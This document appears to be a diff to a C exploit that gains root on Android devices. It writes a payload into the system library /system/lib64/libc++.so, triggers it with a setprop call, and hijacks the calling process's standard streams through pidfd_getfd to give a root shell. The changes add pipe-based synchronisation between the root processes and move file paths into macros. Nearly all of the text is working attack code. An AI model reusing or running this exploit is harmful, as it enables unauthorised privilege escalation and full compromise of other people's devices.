@@ -166,26 +166,8 @@ static void write_file(int fd, loff_t offset, unsigned char *data, size_t data_s
 
 void root_shell();
 
-#include <dlfcn.h>
-// Adapted from: https://stackoverflow.com/questions/28413530/api-to-get-android-system-properties-is-removed-in-arm64-platforms
-typedef int (*fn__system_property_get)(const char *, char *);
-int __system_property_get(const char *name, char *value) {
-    static fn__system_property_get __real_system_property_get = NULL;
-    if (!__real_system_property_get) {
-        // libc.so should already be open, get a handle to it.
-        void *handle = dlopen("libc.so", RTLD_NOLOAD);
-        if (!handle) {
-            LOG("Cannot dlopen libc.so: %s.\n", dlerror());
-        } else {
-            __real_system_property_get = (fn__system_property_get)dlsym(handle, "__system_property_get");
-        }
-        if (!__real_system_property_get) {
-            LOG("Cannot resolve __system_property_get(): %s.\n", dlerror());
-        }
-    }
-    if (!__real_system_property_get) return (0);
-    return (*__real_system_property_get)(name, value);
-}
+#define PID_FILE EXPLOIT_DATA_DIR "/pid"
+#define ROOT_DONE_FILE EXPLOIT_DATA_DIR "/root_done"
 
 int main(int argc, char **argv) {
 	if (argc == 2 && strcmp(argv[1], "shell") == 0) {
@@ -194,9 +176,18 @@ int main(int argc, char **argv) {
 	}
 
 	int pid = getpid();
-	FILE *fp = fopen("/data/local/tmp/pid", "w");
+	FILE *fp = fopen(PID_FILE, "w");
 	fwrite(&pid, sizeof(pid), 1, fp);
 	fclose(fp);
+
+	// set up pipe for synchronizing root processes
+	int pipe_fds[2] = { 0 };
+	SYSCHK(pipe(pipe_fds));
+	SYSCHK(dup2(pipe_fds[1], 16));
+	SYSCHK(dup2(pipe_fds[0], 15));
+	char pipe_input = 0;
+	write(pipe_fds[1], &pipe_input, 1);
+
 
 	int fd = SYSCHK(open("/system/lib64/libc++.so", O_RDONLY));
 	write_file(fd, PAYLOAD_ADDR, PAYLOAD, sizeof(PAYLOAD));
@@ -208,9 +199,14 @@ int main(int argc, char **argv) {
 	system("setprop a a");
 	puts("setprop trigger");
 
-	while (access("/data/local/tmp/root_done", F_OK) != 0) {}
+	while (access(ROOT_DONE_FILE, F_OK) != 0) {}
 	puts("root_done file found");
-	SYSCHK(unlink("/data/local/tmp/root_done"));
+	SYSCHK(unlink(ROOT_DONE_FILE));
+
+	// sleep forever, so root shell takes over
+	for (;;) {
+		sleep(20);
+	}
 
 	return 0;
 }
@@ -229,7 +225,7 @@ void root_shell() {
 
 	int pid = 0;
 
-	FILE* fp = fopen("/data/local/tmp/pid", "r");
+	FILE* fp = fopen(PID_FILE, "r");
 	fread(&pid, sizeof(pid), 1, fp);
 	fclose(fp);
 
@@ -237,11 +233,18 @@ void root_shell() {
 	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
 	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
 	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
+	int pipe_fd = syscall(SYS_pidfd_getfd, pfd, 15, 0);
 	dup2(stdinfd, 0);
 	dup2(stdoutfd, 1);
 	dup2(stderrfd, 2);
 
-	fp = fopen("/data/local/tmp/root_done", "w");
+	char pipe_output = 0;
+	// if eof, it means main process exit, so return
+	if (read(pipe_fd, &pipe_output, 1) <= 0) {
+		return;
+	}
+
+	fp = fopen(ROOT_DONE_FILE, "w");
 	char *s = "OK";
 	fwrite(s, 1, strlen(s), fp);
 	fclose(fp);
